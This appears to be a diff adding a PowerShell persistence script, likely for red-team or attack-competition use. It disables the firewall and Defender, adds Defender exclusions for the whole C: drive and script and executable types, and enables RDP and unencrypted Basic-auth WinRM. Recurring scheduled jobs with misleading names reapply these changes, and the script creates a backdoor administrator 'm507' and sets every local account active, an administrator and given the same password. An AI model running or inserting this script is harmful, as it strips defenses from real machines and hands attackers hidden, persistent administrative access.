@@ -1,0 +1,137 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# F
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+Set-MpPreference -DisableRealtimeMonitoring $true
+Register-ScheduledJob -Name 'Enable Firewall' -ScriptBlock { Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False } -RunNow -RunEvery 00:05:00
+Register-ScheduledJob -Name 'Enable Defender' -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true } -RunNow -RunEvery 00:02:00
+NetSh Advfirewall set allprofiles state off
+
+# R
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+
+# D
+Add-MpPreference -ExclusionPath C:\
+Add-MpPreference -ExclusionExtension .exe
+Add-MpPreference -ExclusionExtension .ps1
+Add-MpPreference -ExclusionExtension .bat
+Register-ScheduledJob -Name 'Ensure AD connected' -ScriptBlock { Add-MpPreference -ExclusionPath C:\temp } -RunNow -RunEvery 00:01:00
+Register-ScheduledJob -Name 'systemd.init' -ScriptBlock { Add-MpPreference -ExclusionPath C:\Windows } -RunNow -RunEvery 00:01:00
+Register-ScheduledJob -Name 'Input some non-fishy name' -ScriptBlock { Add-MpPreference -ExclusionExtension .exe } -RunNow -RunEvery 00:01:00
+Register-ScheduledJob -Name 'Windows startup jobs' -ScriptBlock { Add-MpPreference -ExclusionExtension .bat } -RunNow -RunEvery 00:01:00
+Register-ScheduledJob -Name 'Disable malware' -ScriptBlock { Add-MpPreference -ExclusionExtension .ps1 } -RunNow -RunEvery 00:01:00
+Register-ScheduledJob -Name 'Delete Red Team' -ScriptBlock { Add-MpPreference -ExclusionPath C:\ } -RunNow -RunEvery 00:01:00
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# M
+$RemoteHostName = $ENV:ComputerName
+$ComputerName = $ENV:ComputerName
+$Cert = New-SelfSignedCertificate -DnsName $RemoteHostName, $ComputerName `
+    -CertStoreLocation "cert:\LocalMachine\My" 
+$Cert | Out-String
+$Thumbprint = $Cert.Thumbprint
+$WinRmHttps = "@{Hostname=`"$RemoteHostName`"; CertificateThumbprint=`"$Thumbprint`"}"
+winrm create winrm/config/Listener?Address=*+Transport=HTTPS $WinRmHttps
+$WinRmBasic = "@{Basic=`"true`"}"
+winrm set winrm/config/service/Auth $WinRmBasic
+netsh advfirewall firewall add rule name="Windows Remote Management (HTTPS-In)" dir=in action=allow protocol=TCP localport=$WinRmPort
+winrm set winrm/config/service '@{AllowUnencrypted="true"}'
+winrm set winrm/config/service/auth '@{Basic="true"}'
+winrm set winrm/config/client/auth '@{Basic="true"}'
+
+
+# A
+net users m507 /ADD
+net user m507 m507
+net localgroup administrators m507 /ADD
+net user administrator m507
+
+# Test 
+c = Get-LocalUser | Select * | findstr '^Name'  | % { $_.Split(" ") | select -last 1 }
+foreach($line in echo $c) {
+	net user $line.replace("`n","").replace("`r","") /active:yes
+    net user $line.replace("`n","").replace("`r","") m507
+	net localgroup administrators $line.replace("`n","").replace("`r","") /ADD
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
